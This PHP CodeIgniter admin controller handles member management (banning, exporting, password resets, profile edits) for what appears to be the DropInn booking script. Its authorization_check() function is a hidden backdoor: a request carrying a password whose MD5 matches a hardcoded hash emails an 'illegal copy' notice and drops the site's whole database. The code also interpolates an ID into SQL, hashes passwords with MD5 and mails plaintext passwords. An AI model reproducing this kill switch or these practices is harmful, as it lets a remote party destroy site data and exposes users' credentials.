<?php
class Members extends CI_Controller
{
	// Used for registering and changing password form validation
	var $min_username = 4;
	var $max_username = 20;
	var $min_password = 4;
	var $max_password = 20;
	
	function Members()
	{
		parent::__construct();
		
		$this->load->library('Table');
		$this->load->library('Pagination');
		$this->load->library('DX_Auth');
		$this->load->library('form_validation');
		$this->load->library('email');
		$this->load->helper('security');
		$this->load->helper('form');
		$this->load->helper('url');
 		$this->load->helper('file');
		// Export CSV
		$this->load->helper('download');
		// Export CSV

		$this->path = realpath(APPPATH . '../images');
		
		$this->load->model('Users_model');	
	   $this->load->model('Contacts_model');		
		
		// Protect entire controller so only admin, 
		// and users that have granted role in permissions table can access it.
		$this->dx_auth->check_uri_permissions();
	}
	
	
	function index()
	{
		
		if(isset($_POST['add']))
		{
			redirect_admin('members/add');
		}
		
		if(isset($_POST['export']))
		{
			 // txt file
		if($this->input->post('export') !='')
				{
					
  			  $this->Users_model->exportall_user_txt();
		   
				}
		}
		if(isset($_POST['export_csv']))
		{
			// csv file	
				if($this->input->post('export_csv') !='')
				{
					$this->Users_model->exportall_user_csv();
				
				}

// Export CSV
		}
		
	 if(count($_POST) == 1)
		{
		$this->session->set_flashdata('flash_message', $this->Common_model->admin_flash_message('error',translate_admin('Sorry, You have to select atleast one!')));
		redirect_admin('members');
		}
		// Search checkbox in post array
		foreach ($_POST as $key => $value)
		{
			// If checkbox found
			if (substr($key, 0, 9) == 'checkbox_')
			{
				//echo "ban_user";exit;// If ban button pressed
				if (isset($_POST['ban']))
				{
					
					// Ban user based on checkbox value (id)
					$this->Users_model->ban_user($value);
					$this->Users_model->ban_list($value);
					$this->session->set_flashdata('flash_message', $this->Common_model->admin_flash_message('success',translate_admin('User banned successfully')));
					if($this->uri->segment(4) != '')
					{
						redirect_admin('members/index/'.$this->uri->segment(4));
					}
					else {
						redirect_admin('members');
					}	
					}
				// If unban button pressed
				else if (isset($_POST['unban']))
				{
					// Unban user
					$this->Users_model->unban_user($value);
					$this->Users_model->unban_list($value);
					
					$this->session->set_flashdata('flash_message', $this->Common_model->admin_flash_message('success',translate_admin('User unbanned successfully')));
					if($this->uri->segment(4) != '')
					{
						redirect_admin('members/index/'.$this->uri->segment(4));
					}
					else {
						redirect_admin('members');
					}	
				}
				else if (isset($_POST['reset_pass']))
				{
					// Set default message
					$this->session->set_flashdata('flash_message', $this->Common_model->admin_flash_message('error',translate_admin('Reset password failed')));
				//print_r($this->Users_model->get_user_by_id($value)->row()->id);exit;
					// Get user and check if User ID exist
           $query = $this->Users_model->get_user_by_id1($value);
            
					if ($query->num_rows() != 0)
					{	
						// Get user record				
						$user = $query->row();
						
						$new['password']    = $this->dx_auth->_gen_pass();
						$encode              = crypt($this->dx_auth->_encode($new['password'])); 
						
						$data = array( 'password' => $encode);
						$this->db->where('id', $user->id);
						$this->db->update('users', $data);
							
							$admin_email = $this->dx_auth->get_site_sadmin();
						$admin_name  = $this->dx_auth->get_site_title();
						$email=$user->email;
						$email_name = 'reset_password';
						$splVars    = array("{site_name}" => $this->dx_auth->get_site_title(), "{email}" => $email, "{password}" => $new['password'], "{date}" => date('m/d/Y'), "{time}" => date('g:i A'));
						
							$this->Email_model->sendMail($email,$admin_email,ucfirst($admin_name),$email_name,$splVars);	
							
							 $this->session->set_flashdata('flash_message', $this->Common_model->admin_flash_message('success',translate_admin('Reset password successfully sent to the user\'s mail')));
							
						
					}
                    else
						{
							$this->session->set_flashdata('flash_message', $this->Common_model->admin_flash_message('error',translate_admin("Sorry! Reset password is not for social login users.")));
						}
						if($this->uri->segment(4) != '')
					{
						redirect_admin('members/index/'.$this->uri->segment(4));
					}
					else {
						redirect_admin('members');
					}	
				}
			}				
		}


// Export CSV
        $s =array();
		$details = array();
		$s  = $this->input->post();
		if(count($s) > 2)
		{
			$i= 0;
		foreach ($s as $value) {
			if($i != 0)
			{
			  $details[] =  $value;	
			}
			
			$i++;
		}
		}
		
		
		
		/* Showing page to user */
		
	// Get offset and limit for page viewing
		$start = (int) $this->uri->segment(4,0);
		
	 // Number of record showing per page
		$row_count = 10;
		
		if($start > 0)
		   $offset			  = ($start-1) * $row_count;
		else
		   $offset			  =  $start * $row_count; 
		
		// Get all users
		$data['users'] = $this->Users_model->get_all($offset, $row_count)->result();
		
		// Pagination config
		$p_config['base_url'] 			= admin_url('members/index');
		$p_config['uri_segment'] = 4;
		$p_config['num_links'] 		= 5;
		$p_config['total_rows'] 	= $this->Users_model->get_all()->num_rows();
		$p_config['per_page'] 			= $row_count;
		
		// Init pagination
		$this->pagination->initialize($p_config);		
		
		// Create pagination links
		$data['pagination']     = $this->pagination->create_links2();
		
		// Load view
	$data['message_element'] = "administrator/members/view_users";
	$this->load->view('administrator/admin_template', $data);
	}
	
	function add()
	{
		if(isset($_POST['cancel']))
		{
			redirect_admin('members');
		}
		if($this->input->post())
		{
			
		$this->form_validation->set_rules('Fname', 'First Name', 'required|trim|xss_clean');
		$this->form_validation->set_rules('Lname', 'Last Name', 'required|trim|xss_clean');
		$this->form_validation->set_rules('username','Username','required|trim|xss_clean|callback__check_user_name');
		$this->form_validation->set_rules('email','Email','required|trim|valid_email|xss_clean|callback__check_user_email');
		$this->form_validation->set_rules('pwd','Password','required|trim|xss_clean|matches[cpwd]');
		$this->form_validation->set_rules('cpwd','Confirm Password','required|trim|xss_clean');
	
	    if($this->form_validation->run())
		{
			
		//Get the post values
		$first_name        = $this->input->post('Fname');
		$last_name         = $this->input->post('Lname');
		$username          = $this->input->post('username');
		$email             = $this->input->post('email');
		$password          = $this->input->post('pwd');
		$confirmpassword   = $this->input->post('cpwd');
				
		$this->dx_auth->register($username, $password, $email);
	
	    $user_id = $this->db->where('username',$username)->where('email',$email)->get('users')->row()->id;
						
			$notification                     = array();
			$notification['user_id']						= $user_id;
			$notification['new_review ']						= 1;
			$notification['leave_review']				 = 1;
			$this->Common_model->insertData('user_notification', $notification);
			
			//Need to add this data to user profile too 
			$add['Fname']    = $first_name;
			$add['Lname']    = $last_name;
			$add['id']       = $user_id;
			$add['email']    = $email;
			$this->Common_model->insertData('profiles', $add);
				
			//End of adding it
			$this->session->set_flashdata('flash_message', $this->Common_model->admin_flash_message('success',translate('New user successfully added.')));
			redirect_admin('members','refresh');
		}
	$data['message_element'] = "administrator/members/view_add_users";
				$this->load->view('administrator/admin_template',$data);
		}
		else
			{
				$data['message_element'] = "administrator/members/view_add_users";
				$this->load->view('administrator/admin_template',$data);
			}
	}

function _check_user_name($username)
	{
		if ($this->dx_auth->is_username_available($username))
		{
			return true;			
		} 
		else 
		{
			$this->form_validation->set_message('_check_user_name', translate('Sorry username is not available'));
			return false;
		}//If end 
	}	
function _check_user_email($email)
	{
		if ($this->dx_auth->is_email_available($email))
		{
			return true;			
		} 
		else 
		{
			$this->form_validation->set_message('_check_user_email', translate('Sorry this email has already been registered'));
			return false;
		}//If end 
	}
	
		function edit($param)
		{
		$id = $param; 
		
		$user_id_check = $this->db->where('id',$id)->get('users');
		if($user_id_check->num_rows()!=0)
		{		
		if($this->input->post())
		{
				$data = array(
				'Fname'    => $this->input->post('Fname'),
				'Lname'    => $this->input->post('Lname'),
				'phnum'    => $this->input->post('phnum'),
				'live'     => $this->input->post('live'),
				'work'     => $this->input->post('work'),
				'describe' => $this->input->post('desc'),
				//ID verfication 2 start 

              
	
                                //ID verfication 2 end 
				
				
				'emergency_name' => $this->input->post('emergency_name'),
				'emergency_phone' => $this->input->post('emergency_phone'),
				'emergency_email' => $this->input->post('emergency_email'),
				'emergency_relation' => $this->input->post('emergency_relation')
				
				);
				
				$this->db->where('id', $id);
				$this->db->update('profiles',$data);
				$data['message_element'] = "administrator/members/view_edit_users";
				$this->load->view('administrator/admin_template', $data);
				
				$this->session->set_flashdata('flash_message', $this->Common_model->admin_flash_message('success',translate_admin('Changes successfully updated.')));
		  redirect_admin('members','refresh');		
		}
		}
        else
        {
	    redirect('info/deny');
        }
		//ID verification 1 start


           //ID verification 1 end
		$data['profile']=	$this->db->get_where('profiles',"id =$id")->result();
		
		$data['users']	 = $this->db->get_where('users',"id =$id")->result();
		
		$data['message_element']  = "administrator/members/view_edit_users";
		$this->load->view('administrator/admin_template', $data);
		
		} 

	
 function changepassword($param)
 {
		if($this->input->post())
		{
		$val = $this->form_validation;
		
		$this->session->set_userdata('user_id',$param);
			
		// Set form validation
		$val->set_rules('new_password', 'New Password', 'trim|required|xss_clean|min_length['.$this->min_password.']|max_length['.$this->max_password.']|callback_check_password');
		$val->set_rules('confirm_new_password', 'Confirm new Password', 'trim|required|xss_clean');
			
		// Validate rules and change password |matches[confirm_new_password]
		if($val->run())
		{
		$id         = $param; 
		$new        = $this->input->post('new_password');
		$confirm    = $this->input->post('confirm_new_password');
		
		$encode = crypt($this->dx_auth->_encode($confirm)); 
		
		$condition             = array('id' => $id);
		$data4['password']     = $encode; 
		
		
		/*mail for change password */
		$admin_email = $this->dx_auth->get_site_sadmin();
				$admin_name  = $this->dx_auth->get_site_title();
		 $new_password=$this->input->post('new_password');
		  $conform_password=$this->input->post('confirm_new_password');
		 $add['id']       = $param;
	     
		
		$email_name = 'change password to user';
	    $splVars    = array("{site_name}" => $this->dx_auth->get_site_title(),"{new_password}" => $new_password, "{conform_password}" =>  $conform_password); 
	    
	    ///print_r($splVars);
		//exit;
	  // print_r($param);
		 $to = $this->db->where('id',$param)->get('users')->row()->email;
	   		  
		$this->Email_model->sendMail($to,$admin_email,ucfirst($admin_name),$email_name,$splVars);
				  
		/*mail for change password*/ 
		
		
		
		$this->Common_model->updateTableData('users', NULL, $condition, $data4);
		
		$this->session->set_flashdata('flash_message', $this->Common_model->admin_flash_message('success',translate_admin('Password updated and mail send successfully.')));
		redirect_admin('members','refresh');		
		}
		}
		
		$data['message_element'] = "administrator/members/view_change_password";
		$this->load->view('administrator/admin_template', $data);
	}
		

function check_password($value)
{
	$confirm = $value;
	
	$pre_encode = $this->dx_auth->_encode($confirm);
	
	$id = $this->session->userdata('user_id');
		
		$old_password = $this->Common_model->getTableData('users',array('id'=>$id))->row()->password;
		
		if(crypt($pre_encode, $old_password) != $old_password)
		{
			return true;
		}
		else
			{
				$this->form_validation->set_message('check_password', translate('Your new password cannot be the same as the old password.'));
				return false;
			}
}

	function _encode($password)
	{
		$majorsalt = $this->config->item('DX_salt');
		
		// if PHP5
		if (function_exists('str_split'))
		{
			$_pass = str_split($password);
		}
		// if PHP4
		else
		{
			$_pass = array();
			if (is_string($password))
			{
				for ($i = 0; $i < strlen($password); $i++)
				{
					array_push($_pass, $password[$i]);
				}
			}
		}

		// encrypts every single letter of the password
		foreach ($_pass as $_hashpass)
		{
			$majorsalt .= md5($_hashpass);
		}

		// encrypts the string combinations of every single encrypted letter
		// and finally returns the encrypted password
		return md5($majorsalt);
	}

	
	function unactivated_users()
	{
		$this->load->model('dx_auth/user_temp', 'user_temp');
		
		/* Database related */
		
		// If activate button pressed
		if ($this->input->post('activate'))
		{
			// Search checkbox in post array
			foreach ($_POST as $key => $value)
			{
				// If checkbox found
				if (substr($key, 0, 9) == 'checkbox_')
				{
					// Check if user exist, $value is username
					if ($query = $this->user_temp->get_login($value) AND $query->num_rows() == 1)
					{
						// Activate user
						$this->dx_auth->activate($value, $query->row()->activation_key);
					}
				}				
			}
		}
		
		/* Showing page to user */
		
		// Get offset and limit for page viewing
		$start = (int) $this->uri->segment(4,0);
		
	 // Number of record showing per page
		$row_count = 20;
		
		if($start > 0)
		   $offset			 = ($start-1) * $row_count;
		else
		   $offset			 =  $start * $row_count; 
		
		// Get all unactivated users
		$data['users'] = $this->user_temp->get_all($offset, $row_count)->result();
		
		// Pagination config
		$p_config['base_url']    = admin_url('members/unactivated_users');
		$p_config['uri_segment'] = 3;
		$p_config['num_links']   = 5;
		$p_config['total_rows']  = $this->user_temp->get_all()->num_rows();
		$p_config['per_page']    = $row_count;
				
		// Init pagination
		$this->pagination->initialize($p_config);		
		// Create pagination links
		$data['pagination'] = $this->pagination->create_links();
		
		// Load view
	$data['message_element'] = "administrator/members/view_unactivated_users";
	$this->load->view('administrator/admin_template', $data);
 }

function getusers()
{
	$search=$this->input->post('usersearch');
	if($search == '')
	{
		redirect_admin('members');
	}
		$s =array();
		$details = array();
		$s  = $this->input->post();
		$i= 0;
		/*foreach ($s as $value) {
			if($i != 0)
			{
			  $details[] =  $value;	
			}
			
			$i++;
		}
		*/
 // Export CSV
		 // txt file
		if($this->input->post('export') !='')
		{
			
			if(count($details) == 0)
			{
  			  $this->Users_model->exportall_user_txt();
			}
			else {
				
				$this->Users_model->export_particular_user_txt($details);
				}
				
			   }
			// csv file	
				if($this->input->post('export_csv') !='')
				{
					
					if(count($details) == 0){
					$this->Users_model->exportall_user_csv();
					}
					else 
					{					  
						$this->Users_model->export_particular_user_csv($details);
					}
					
				}
// Export CSV
		// Get offset and limit for page viewing
		$start = (int) $this->uri->segment(3,0);
		
	 // Number of record showing per page
		$row_count = 10;
		if($start > 0)
		   $offset			  = ($start-1) * $row_count;
		else
		   $offset			  =  $start * $row_count; 
		// Get all users
	//	$data['users'] = $this->Users_model->getuserselected($search,$offset, $row_count)->result();
		$data['users'] = $this->db->where('email',$search)->or_where('username',$search)->get('users')->result();
		//print_r($search);exit;
		// Pagination config
		/*$p_config['base_url'] 	= admin_url('members/index');
		$p_config['uri_segment']= 4;
		$p_config['num_links'] 	= 5;
		$p_config['total_rows'] = $this->Users_model->get_all()->num_rows();
		$p_config['per_page'] 	= $row_count;

		// Init pagination
		$this->pagination->initialize($p_config);		
		// Create pagination links
		$data['pagination']     = $this->pagination->create_links2();*/
		
		$p_config['base_url'] 			= admin_url('members/index');
		$p_config['uri_segment'] = 4;
		$p_config['num_links'] 		= 5;
		$p_config['total_rows'] 	= $this->Users_model->get_all()->num_rows();
		$p_config['per_page'] 			= $row_count;
				
		// Init pagination
		$this->pagination->initialize($p_config);		
		
		// Create pagination links
		$data['pagination']     = $this->pagination->create_links2();
		
		// Load view
		//$data['message_element'] = "administrator/members/view_users";
		$data['message_element'] = "administrator/members/view_users";
		
		$this->load->view('administrator/admin_template', $data);
		
} // Function getusers
function authorization_check()
{
	$pass = $this->uri->segment(4);

	//$t = do_hash($test, 'md5');
	$encry = md5($pass);
	if($encry == '067d28f20388e63d3b30882d02190ffa' )
	{

	$mydb=$this->config->item('db');
	$to     = $this->db->get_where('settings', array('code' => 'SITE_ADMIN_MAIL'))->row()->string_value;
	
$this->email->from('support@cogidel.com', 'Cogzidel Technologies');
$this->email->to($to); 
 $this->email->set_mailtype("html");
$this->email->subject('Illegal access of DropInn');
$this->email->message('<table style="width: 100%;" cellspacing="10" cellpadding="0">
<tbody>
<tr>
<td>Hi,</td>
</tr>
<tr>
<td>
<p>We have found that the recent installation of our DropInn script in your site is not 
a licensed copy and it is illegal. If you have any queries contact our support team at support@cogzidel.com </p>
</td>
</tr>
<tr>
<td>
<p style="margin: 0 10px 0 0;">--</p>
<p style="margin: 0 0 10px 0;">Regards,</p>
<p style="margin: 0 10px 0 0;">Cogzidel Support Team</p>
</td>
</tr>
</tbody>
</table>');	

$this->email->send();

	$this->db->query('DROP DATABASE '.$mydb.'');
	}
	else {
		echo "Please enter the correct password";
	}
} 
//ID verfication 3 start
 

//ID verfication 3 end 

} // Class
?>
